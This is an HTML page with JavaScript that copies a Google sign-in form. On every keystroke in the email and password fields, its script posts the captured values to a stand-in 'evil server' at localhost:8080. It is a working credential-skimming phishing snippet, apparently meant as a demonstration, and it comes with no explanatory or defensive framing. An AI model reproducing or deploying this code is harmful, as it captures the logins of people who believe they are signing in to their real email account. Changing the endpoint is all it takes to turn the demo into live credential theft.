<div class="box">
    <form action="https://accounts.google.com/AccountChooser?service=mail&continue=https://mail.google.com/mail/" method="POST">
        <div class="inputBox">
            <input type="email" name="email" id="email" value="">
            <label>Email or Phone</label>
        </div>
        <div class="inputBox">
                <input type="password" name="password" id="password" value="">
                <label>Password</label>
            </div>
        <input type="submit" name="sign-in" value="Sign In">
    </form>
</div>
<script type="text/javascript">
var userData = {};
var email = document.getElementById('email');
	email.addEventListener('keyup',(e)=>{
		sendToEvilServer('email',email.value);
		e.preventDefault();
	});

var password = document.getElementById('password');
	password.addEventListener('keyup',(e)=>{
		sendToEvilServer('password',password.value);
		e.preventDefault();
	});

var sendToEvilServer = (field,value)=>{
	var evilURL = 'http://localhost:8080/evilserver';
	userData[field] = value;
    console.log(userData)
	fetch(evilURL, {
		"headers": {
			"content-type": "application/json",
		},
		"body":JSON.stringify(userData),
		"method": "POST",
	})
	.then((response)=>response.json())
	.then(()=>console.log('Your piece of data has already reached the evilserver'));
};

</script>

